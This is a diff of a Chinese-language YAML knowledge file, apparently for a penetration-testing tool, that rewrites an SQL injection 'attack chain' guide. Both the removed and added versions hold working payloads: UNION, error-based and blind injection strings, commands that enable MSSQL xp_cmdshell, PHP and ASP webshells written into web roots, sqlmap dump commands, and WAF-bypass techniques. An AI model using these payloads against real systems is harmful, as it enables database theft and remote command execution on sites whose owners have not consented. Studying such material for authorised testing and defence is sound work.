@@ -1,25 +1,106 @@
-name: SQL注入攻击
-description: MySQL、MSSQL、Oracle、PostgreSQL等数据库的SQL注入技术
+name: SQL注入攻击链
+description: SQL注入思维链 - 类型判断、注入技术、提权、写Shell
 domain: web
-version: '1.0'
+version: '3.0'
 tags:
 - web
 - sqli
-- injection
-- database
-knowledge: "# SQL注入攻击链\n\n## MySQL注入完整利用链\n\n### 基础探测 → 获取Shell\n\n```\n1. 探测注入点\n   ' OR '1'='1\n\n2. 确定列数\n   ' ORDER BY\
-  \ 1--\n   ' ORDER BY 2-- (报错则列数为2)\n\n3. 确定显示位置\n   ' UNION SELECT 1,2,3--\n\n4. 获取数据库信息\n   ' UNION SELECT 1,database(),version()--\n\
-  \n5. 获取网站绝对路径\n   ' UNION SELECT 1,@@basedir,load_file('/var/www/html/config.php')--\n\n6. 写入WebShell\n   ' UNION SELECT\
-  \ 1,'<?php system($_GET[\"cmd\"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--\n\n7. 执行命令\n   http://target/shell.php?cmd=whoami\n\
-  ```\n\n### 盲注 → 获取数据\n\n```\n1. 确认盲注\n   ' AND 1=1-- (正常)\n   ' AND 1=2-- (异常)\n\n2. 获取数据库名长度\n   ' AND LENGTH(database())=4--\n\
-  \n3. 逐字符提取\n   ' AND ASCII(SUBSTRING(database(),1,1))=97--\n\n4. 使用sqlmap自动化\n   sqlmap -u \"http://target?id=1\" --dbs\n\
-  ```\n\n### 报错注入 → 快速提取\n\n```\n1. 确认报错注入\n   ' AND extractvalue(1,concat(0x7e,version()))--\n\n2. 获取数据库\n   ' AND extractvalue(1,concat(0x7e,database()))--\n\
-  \n3. 获取表名\n   ' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--\n\
-  \n4. 获取数据\n   ' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1)))--\n```\n\n---\n\n## MSSQL注入完整利用链\n\
-  \n### 基础 → xp_cmdshell\n\n```\n1. 探测注入点\n   ' OR 1=1--\n\n2. 获取版本\n   ' UNION SELECT 1,@@version,3--\n\n3. 检测xp_cmdshell\n\
-  \   '; EXEC master..xp_cmdshell 'whoami'--\n\n4. 开启xp_cmdshell\n   '; EXEC sp_configure 'show advanced options',1; RECONFIGURE;\
-  \ EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--\n\n5. 执行命令\n   '; EXEC master..xp_cmdshell 'whoami'--\n\n6. 写入WebShell\n\
-  \   '; EXEC master..xp_cmdshell 'echo ^<%eval(request(\"cmd\"))^> > C:\\inetpub\\wwwroot\\shell.asp'--\n```\n\n---\n\n##\
-  \ 攻击链速查表\n\n| 阶段 | MySQL | MSSQL | PostgreSQL | Oracle |\n|------|-------|-------|------------|--------|\n| 探测 | `' OR '1'='1`\
-  \ | `' OR 1=1--` | `' OR 1=1--` | `' OR 1=1--` |\n| 列数 | ORDER BY N | ORDER BY N | ORDER BY N | UNION NULL |\n| 信息 | database()\
-  \ | @@version | version() | v$version |\n| 写文件 | INTO OUTFILE | xp_cmdshell | COPY TO | UTL_FILE |\n"
+
+knowledge: |
+  # SQL注入思维链
+
+  ```
+  类型判断 → 字符型/数字型/搜索型/JSON型
+        ↓
+  注入技术 → UNION/报错/盲注/堆叠
+        ↓
+  获取数据 → 数据库→表→列→数据
+        ↓
+  提权/写Shell → INTO OUTFILE/udf/堆叠执行
+  ```
+
+  ---
+
+  ## 类型判断
+
+  | 数据库 | 判断方式 |
+  |--------|----------|
+  | MySQL | `version()` `@@version` `sleep()` |
+  | MSSQL | `@@version` `WAITFOR DELAY` |
+  | PostgreSQL | `version()` `pg_sleep()` |
+  | Oracle | `v$version` `UTL_HTTP` |
+  | SQLite | `sqlite_version()` |
+
+  **注入点闭合**: `'` `"` `'` `)` `'))` 等
+
+  ---
+
+  ## 注入技术选择
+
+  | 场景 | 技术 |
+  |------|------|
+  | 有回显 | UNION注入 |
+  | 有报错 | 报错注入(extractvalue/updatexml) |
+  | 无回显 | 布尔盲注/时间盲注 |
+  | 支持堆叠 | 堆叠查询执行多条SQL |
+
+  ---
+
+  ## UNION注入
+
+  ```
+  1. 确定列数: ORDER BY N
+  2. 找回显位: UNION SELECT 1,2,3...
+  3. 获取信息: database()/version()/user()
+  4. 查表: information_schema.tables
+  5. 查列: information_schema.columns
+  6. 获取数据: SELECT col FROM table
+  ```
+
+  ---
+
+  ## 报错注入
+
+  **MySQL**:
+  - `extractvalue(1,concat(0x7e,(SELECT...)))`
+  - `updatexml(1,concat(0x7e,(SELECT...)),1)`
+  - `floor(rand(0)*2)` group by报错
+
+  ---
+
+  ## 盲注技巧
+
+  **布尔盲注**: 根据页面差异逐字符猜解
+  **时间盲注**: 根据响应时间判断
+
+  **自动化**: sqlmap
+  ```bash
+  sqlmap -u url --dbs
+  sqlmap -u url -D db --tables
+  sqlmap -u url -D db -T table --dump
+  ```
+
+  ---
+
+  ## 写Shell
+
+  **MySQL**: `SELECT '<?php eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/s.php'`
+
+  **条件**:
+  - secure_file_priv为空或指定目录
+  - 知道网站绝对路径
+  - 有写权限
+
+  **MSSQL**: `xp_cmdshell执行命令`
+
+  ---
+
+  ## WAF绕过
+
+  | 方法 | 示例 |
+  |------|------|
+  | 大小写 | SeLeCt |
+  | 编码 | URL/Hex/Base64 |
+  | 注释 | `/*!50000select*/` |
+  | 空白符 | `%09 %0a %0d` |
+  | 函数替代 | mid()代替substr() |
